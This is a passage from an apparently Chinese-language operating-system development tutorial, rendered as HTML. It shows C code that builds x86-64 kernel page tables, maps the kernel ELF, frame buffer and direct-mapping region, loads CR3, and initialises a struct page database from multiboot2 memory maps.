class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PDE_DEFAULT     (PDE_ATTR_P | PDE_ATTR_RW)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">boot_mm_pgtable_map</span><span class="hljs-params">(<span class="hljs-type">phys_addr_t</span> pgtable,</span><br><span class="hljs-params">                        <span class="hljs-type">virt_addr_t</span> va,</span><br><span class="hljs-params">                        <span class="hljs-type">phys_addr_t</span> pa, </span><br><span class="hljs-params">                        <span class="hljs-type">page_attr_t</span> attr)</span><br>&#123;<br>    <span class="hljs-type">pgd_t</span> *pgd;<br>    <span class="hljs-type">pud_t</span> *pud;<br>    <span class="hljs-type">pmd_t</span> *pmd;<br>    <span class="hljs-type">pte_t</span> *pte;<br>    <span class="hljs-type">int</span> pgd_i = PGD_ENTRY(va);<br>    <span class="hljs-type">int</span> pud_i = PUD_ENTRY(va);<br>    <span class="hljs-type">int</span> pmd_i = PMD_ENTRY(va);<br>    <span class="hljs-type">int</span> pte_i = PTE_ENTRY(va);<br><br>    pgd = (<span class="hljs-type">pgd_t</span>*) pgtable;<br>    <span class="hljs-keyword">if</span> (!pgd[pgd_i]) &#123;<br>        pgd[pgd_i] = (<span class="hljs-type">pgd_t</span>) boot_mm_page_alloc();<br>        <span class="hljs-keyword">if</span> (IS_ERR_PTR((<span class="hljs-type">void</span>*) pgd[pgd_i])) &#123;<br>            pgd[pgd_i] = (<span class="hljs-type">pgd_t</span>) <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        boot_memset((<span class="hljs-type">void</span>*) ((<span class="hljs-type">phys_addr_t</span>) pgd[pgd_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pgd[pgd_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pud = (<span class="hljs-type">pud_t</span>*) (pgd[pgd_i] &amp; PAGE_MASK);<br>    <span class="hljs-keyword">if</span> (!pud[pud_i]) &#123;<br>        pud[pud_i] = (<span class="hljs-type">pud_t</span>) boot_mm_page_alloc();<br>        <span class="hljs-keyword">if</span> (IS_ERR_PTR((<span class="hljs-type">void</span>*) pud[pud_i])) &#123;<br>            pud[pud_i] = (<span class="hljs-type">pud_t</span>) <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        boot_memset((<span class="hljs-type">void</span>*) ((<span class="hljs-type">phys_addr_t</span>) pud[pud_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pud[pud_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pmd = (<span class="hljs-type">pmd_t</span>*) (pud[pud_i] &amp; PAGE_MASK);<br>    <span class="hljs-keyword">if</span> (!pmd[pmd_i]) &#123;<br>        pmd[pmd_i] = (<span class="hljs-type">pmd_t</span>) boot_mm_page_alloc();<br>        <span class="hljs-keyword">if</span> (IS_ERR_PTR((<span class="hljs-type">void</span>*) pmd[pmd_i])) &#123;<br>            pmd[pmd_i] = (<span class="hljs-type">pmd_t</span>) <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        boot_memset((<span class="hljs-type">void</span>*) ((<span class="hljs-type">phys_addr_t</span>) pmd[pmd_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pmd[pmd_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pte = (<span class="hljs-type">pte_t</span>*) (pmd[pmd_i] &amp; PAGE_MASK);<br>    pte[pte_i] = pa | attr;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们可以开始重新建立新的页表映射了，我们首先映射这几个区域：</p><ul><li><p>内核 ELF，用于正常执行代码</p></li><li><p>内存直接映射区，映射整个已知的物理内存空间，用于直接访问物理内存以及后续的内核小对象内存分配器</p></li><li><p>此外，对于存在 frame buffer 的情况，我们还需要映射 frame buffer 所在内存</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_shdr</span> *<span class="hljs-title">shdr</span>;</span><br>    <span class="hljs-type">void</span> *shdr_end;<br>    <span class="hljs-type">phys_addr_t</span> seg_phys_start, seg_phys_end;<br>    <span class="hljs-type">virt_addr_t</span> seg_virt_start, seg_virt_end;<br>    <span class="hljs-type">page_attr_t</span> pte_attr;<br>    <span class="hljs-type">phys_addr_t</span> physmem_start, physmem_end;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">pgdb_base</span>;</span><br>    <span class="hljs-type">size_t</span> __pgdb_page_nr;<br>    <span class="hljs-type">int</span> ret;<br><br>    boot_kern_pgtable = (<span class="hljs-type">phys_addr_t</span>) boot_mm_page_alloc();<br>    <span class="hljs-keyword">if</span> (IS_ERR_PTR((<span class="hljs-type">void</span>*) boot_kern_pgtable)) &#123;<br>        boot_puts(<span class="hljs-string">&quot;[x] FAILED to allocate new page table!&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br>    boot_memset((<span class="hljs-type">void</span>*) boot_kern_pgtable, <span class="hljs-number">0</span>, PAGE_SIZE);<br><br>    <span class="hljs-comment">/* map kernel ELF */</span><br>    shdr_end = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">phys_addr_t</span>) &amp;elf_info_tag-&gt;sections<br>               + elf_info_tag-&gt;num * <span class="hljs-keyword">sizeof</span>(*shdr));<br><br>    <span class="hljs-keyword">for</span> (shdr = (<span class="hljs-type">void</span>*) &amp;elf_info_tag-&gt;sections;<br>         (<span class="hljs-type">void</span>*) shdr &lt; shdr_end;<br>         shdr = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">phys_addr_t</span>) shdr + <span class="hljs-keyword">sizeof</span>(*shdr))) &#123;<br><br>        <span class="hljs-keyword">if</span> (!(shdr-&gt;sh_flags &amp; SHF_ALLOC)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (shdr-&gt;sh_type &amp; SHT_PROGBITS) &#123;    <span class="hljs-comment">/* for .text, .data, .rodata */</span><br>            seg_phys_start = <span class="hljs-number">0x100000</span> + shdr-&gt;sh_offset - PAGE_SIZE;<br>            seg_phys_end = PAGE_ALIGN(seg_phys_start + shdr-&gt;sh_size);<br>            seg_virt_start =shdr-&gt;sh_addr;<br><br>            <span class="hljs-keyword">while</span> (seg_phys_start &lt; seg_phys_end) &#123;<br>                pte_attr = PTE_ATTR_P;<br>                <span class="hljs-keyword">if</span> (shdr-&gt;sh_flags &amp; SHF_WRITE) &#123;<br>                    pte_attr |= PTE_ATTR_RW;<br>                &#125;<br><br>                ret = boot_mm_pgtable_map(boot_kern_pgtable,<br>                                          seg_virt_start,<br>                                          seg_phys_start,<br>                                          pte_attr);<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                    <span class="hljs-keyword">return</span> ret;<br>                &#125;<br><br>                seg_phys_start += PAGE_SIZE;<br>                seg_virt_start += PAGE_SIZE;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shdr-&gt;sh_type &amp; SHT_NOBITS) &#123;   <span class="hljs-comment">/* for .bss */</span><br>            seg_virt_start = shdr-&gt;sh_addr;<br>            seg_virt_end = PAGE_ALIGN(seg_virt_start + shdr-&gt;sh_size);<br><br>            <span class="hljs-keyword">while</span> (seg_virt_start &lt; seg_virt_end) &#123;<br>                pte_attr = PTE_ATTR_P;<br>                <span class="hljs-keyword">if</span> (shdr-&gt;sh_flags &amp; SHF_WRITE) &#123;<br>                    pte_attr |= PTE_ATTR_RW;<br>                &#125;<br><br>                seg_phys_start = (<span class="hljs-type">phys_addr_t</span>) boot_mm_page_alloc();<br>                <span class="hljs-keyword">if</span> (IS_ERR_PTR((<span class="hljs-type">void</span>*) seg_phys_start)) &#123;<br>                    <span class="hljs-keyword">return</span> -ENOMEM;<br>                &#125;<br><br>                boot_memset((<span class="hljs-type">void</span>*) seg_phys_start, <span class="hljs-number">0</span>, PAGE_SIZE);<br>                ret = boot_mm_pgtable_map(boot_kern_pgtable,<br>                                          seg_virt_start,<br>                                          seg_phys_start,<br>                                          pte_attr);<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                    <span class="hljs-keyword">return</span> ret;<br>                &#125;<br><br>                seg_virt_start += PAGE_SIZE;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">/* unknown but we need to allocate??? */</span><br>            boot_puts(<span class="hljs-string">&quot;[x] Unknown segment. ELF mapping stopped.&quot;</span>);<br>            <span class="hljs-keyword">return</span> -EFAULT;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* map for frame buffer */</span><br>    <span class="hljs-keyword">if</span> (boot_tty_has_fb()) &#123;<br>        seg_phys_start = ((<span class="hljs-type">phys_addr_t</span>) boot_fb_base) &amp; PAGE_MASK;<br>        seg_virt_start = seg_phys_start;<br>        seg_phys_end = PAGE_ALIGN(seg_phys_start + boot_tty_fb_sz());<br>        <span class="hljs-keyword">while</span> (seg_phys_start &lt; seg_phys_end) &#123;<br>            ret = boot_mm_pgtable_map(boot_kern_pgtable,<br>                                      seg_virt_start,<br>                                      seg_phys_start,<br>                                      PTE_ATTR_P | PTE_ATTR_RW);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br><br>            seg_phys_start += PAGE_SIZE;<br>            seg_virt_start += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* map for direct mapping area */</span><br>    physmem_start = physmem_end = <span class="hljs-number">0x0000000000000000</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        <span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr &amp; PAGE_MASK;<br>        <span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br>        <span class="hljs-type">virt_addr_t</span> vaddr = base + KERN_DIRECT_MAP_REGION_BASE;<br><br>        <span class="hljs-keyword">if</span> (end &gt; physmem_end) &#123;<br>            physmem_end = end;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vaddr &lt; base) &#123;<br>            boot_printstr(<span class="hljs-string">&quot;[x] FATAL: memory region base 0x&quot;</span>);<br>            boot_printhex(base);<br>            boot_puts(<span class="hljs-string">&quot; has caused an integer overflow in memory mapping.&quot;</span>);<br>            <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot; hlt &quot;</span>)</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (base &lt; end) &#123;<br>            <span class="hljs-keyword">if</span> (vaddr &gt; KERN_DIRECT_MAP_REGION_END) &#123;   <span class="hljs-comment">/* out of 64TB */</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            ret = boot_mm_pgtable_map(boot_kern_pgtable,<br>                                vaddr,<br>                                base,<br>                                PTE_ATTR_P | PTE_ATTR_RW);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br><br>            base += PAGE_SIZE;<br>            vaddr += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><h3 id="Extra-添加-KASLR-支持"><a href="#Extra-添加-KASLR-支持" class="headerlink" title="Extra. 添加 KASLR 支持"></a><em>Extra. 添加 KASLR 支持</em></h3><blockquote><p>咕咕咕 🕊🕊🕊</p><p>暂时先留给大家当课后作业了，tips：映射前给几个变量加上偏移值就行，不过你或许还需要额外修改一些链接 flags？ ： ）</p></blockquote><h2 id="建立内存页数据库"><a href="#建立内存页数据库" class="headerlink" title="建立内存页数据库"></a>建立内存页数据库</h2><p>接下来我们开始建立 <strong>内存页数据库</strong> （page database），这一个内存区域的存在是为了能够更好地管理所有的物理页框，首先我们使用如下结构表示单张内存页，其中 <code>type</code> 字段用来表示当前内存页的类型，<code>ref_count</code> 字段为当前页面的引用计数（闲置时为 <code>-1</code>），其他字段我们会在后续使用到时进行说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    PAGE_NON_EXISTED = <span class="hljs-number">0</span>,<br>    PAGE_NORMAL_MEM,<br>    PAGE_RESERVED,<br>    PAGE_ACPI_RECLAIMABLE,<br>    PAGE_NVS,<br>    PAGE_BADRAM,<br>&#125;;<br><br><span class="hljs-comment">/* for `type == PAGE_NORMAL_MEM` only */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migrate_type</span> &#123;</span><br>    MIGRATE_UNMOVABLE = <span class="hljs-number">0</span>,<br>    MIGRATE_MOVABLE,<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct page</span><br><span class="hljs-comment"> * - representing a physical page frame</span><br><span class="hljs-comment"> * - page-aligned size</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* for page allocator */</span><br>        <span class="hljs-type">unsigned</span> type: <span class="hljs-number">4</span>;<br>        <span class="hljs-type">unsigned</span> migrate_type: <span class="hljs-number">4</span>;<br>        <span class="hljs-type">unsigned</span> is_free: <span class="hljs-number">1</span>; <span class="hljs-comment">/* already in freelist */</span><br>        <span class="hljs-type">unsigned</span> is_head: <span class="hljs-number">1</span>; <span class="hljs-comment">/* head of a group of pages*/</span><br>        <span class="hljs-type">unsigned</span> order: <span class="hljs-number">4</span>;<br>    &#125;;<br>    <span class="hljs-type">atomic_t</span> ref_count;     <span class="hljs-comment">/* used only for PAGE_NORMAL_MEM pages */</span><br>    <span class="hljs-type">atomic_t</span> map_count;     <span class="hljs-comment">/* mapped count in processes */</span><br>    <span class="hljs-type">spinlock_t</span> lock;<br>    <span class="hljs-type">void</span> **freelist;    <span class="hljs-comment">/* used only when the slub is not a cpu partial */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">kc</span>;</span>  <span class="hljs-comment">/* used only when it&#x27;s a slub page */</span><br>    <span class="hljs-type">size_t</span> obj_nr;      <span class="hljs-comment">/* used only when it&#x27;s a slub page */</span><br><br>    <span class="hljs-comment">/* unused area to make it page-aligned, maybe we can put sth else there? */</span><br>    <span class="hljs-type">size_t</span> unused[<span class="hljs-number">0</span>];<br>&#125; __attribute__((aligned(<span class="hljs-number">64</span>)));<br></code></pre></td></tr></table></figure><p>现在我们引入内存页数据库的概念，这是一个由 <code>struct page</code> 所组成的数组， <strong>数组下标直接对应物理页框号</strong> ，通过这样的一个结构我们便能非常方便地管理所有的内存页，由于 <code>struct page</code> 大小为 64 字节，我们的内存页数据库将会使用相当数量的内存来表示所有的内存，为了保证这是一个虚拟地址连续的数组， <strong>我们单独分配一个内存区域来存放 page 结构体</strong> ：</p><p><img src="https://s2.loli.net/2024/06/22/aeqr5QcwOKJzNfy.png"></p><p>我们首先进行该区域的映射建立：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* ... */</span><br>    <br>    <span class="hljs-comment">/* map for page database (`struct page` array) */</span><br>    __pgdb_base = (<span class="hljs-type">void</span>*) KERN_PAGE_DATABASE_REGION_BASE;<br>    __pgdb_page_nr = (physmem_end - physmem_start) / PAGE_SIZE;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; __pgdb_page_nr; i += PGDB_PG_PAGE_NR) &#123;<br>        <span class="hljs-type">void</span> *new_page = boot_mm_page_alloc();<br><br>        <span class="hljs-keyword">if</span>(IS_ERR_PTR(new_page)) &#123;<br>            <span class="hljs-keyword">return</span> PTR_ERR(new_page);<br>        &#125;<br><br>        boot_memset((<span class="hljs-type">void</span>*) new_page, <span class="hljs-number">0</span>, PAGE_SIZE);<br>        ret = boot_mm_pgtable_map(boot_kern_pgtable,<br>                                  (<span class="hljs-type">virt_addr_t</span>) &amp;__pgdb_base[i],<br>                                  (<span class="hljs-type">phys_addr_t</span>) new_page,<br>                                  PTE_ATTR_P | PTE_ATTR_RW);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> ret;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>完成这些工作之后， <strong>我们便直接装载这份新的页表，作为后续正式的内核页表</strong> ，并初始化一些记录内存段的变量，以及将一些可能还会用到的指针重新映射到 <code>Direct Mapping Area</code> ，因为我们不能保证在加载新页表后其所在内存区域仍然有映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_mm_load_pgtable</span><span class="hljs-params">(<span class="hljs-type">phys_addr_t</span> pgtable)</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov    %0, %%rax;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov    %%rax, %%cr3;&quot;</span></span><br><span class="hljs-params">        :</span><br><span class="hljs-params">        : <span class="hljs-string">&quot;a&quot;</span> (pgtable)</span><br><span class="hljs-params">    )</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* ... */</span>    <br><br>    <span class="hljs-comment">/* load the new page table now! */</span><br>    boot_mm_load_pgtable(boot_kern_pgtable);<br><br>    <span class="hljs-comment">/* init for some vals */</span><br>    physmem_base = KERN_DIRECT_MAP_REGION_BASE;<br>    kernel_base = KERN_SEG_TEXT_REGION_START;<br>    vmremap_base = KERN_DYNAMIC_MAP_REGION_BASE;<br>    pgdb_base = __pgdb_base;<br>    pgdb_page_nr = __pgdb_page_nr;<br><br>    <span class="hljs-comment">/* remap some variables we may still use */</span><br>    elf_info_tag = (<span class="hljs-type">void</span>*) phys_to_virt((<span class="hljs-type">phys_addr_t</span>) elf_info_tag);<br>    mmap_tag = (<span class="hljs-type">void</span>*) phys_to_virt((<span class="hljs-type">phys_addr_t</span>) mmap_tag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们根据 multiboot2 tags 所提供的内存信息来初始化 page 结构体数组，并根据临时线性内存分配器的分配地址计算页面引用计数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">boot_mm_page_database_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * as we set all page to 0 at the beginning,we don&#x27;t need to care about hole</span><br><span class="hljs-comment">     * because the type for memory hole is 0 in our design</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        <span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr;<br>        <span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br>        <span class="hljs-type">size_t</span> pfn;<br><br>        <span class="hljs-keyword">while</span> (base &lt; end) &#123;<br>            pfn = base / PAGE_SIZE;<br>            pgdb_base[pfn].migrate_type = MIGRATE_UNMOVABLE;<br>            spin_lock_init((&amp;pgdb_base[pfn].lock));<br><br>            <span class="hljs-keyword">switch</span> (mmap_tag-&gt;entries[i].type) &#123;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_AVAILABLE:<br>                pgdb_base[pfn].type = PAGE_NORMAL_MEM;<br>                pgdb_base[pfn].kc = <span class="hljs-literal">NULL</span>;<br>                pgdb_base[pfn].freelist = <span class="hljs-literal">NULL</span>;<br>                pgdb_base[pfn].obj_nr = <span class="hljs-number">0</span>;<br><br>                <span class="hljs-keyword">if</span> (base &lt; curr_avail || addr_is_in_used_range(base)) &#123;<br>                    <span class="hljs-comment">/* used page */</span><br>                    <span class="hljs-type">atomic_set</span>(&amp;pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">/* free page */</span><br>                    <span class="hljs-type">atomic_set</span>(&amp;pgdb_base[pfn].ref_count, <span class="hljs-number">-1</span>);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_RESERVED:<br>                pgdb_base[pfn].type = PAGE_RESERVED;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_ACPI_RECLAIMABLE:<br>                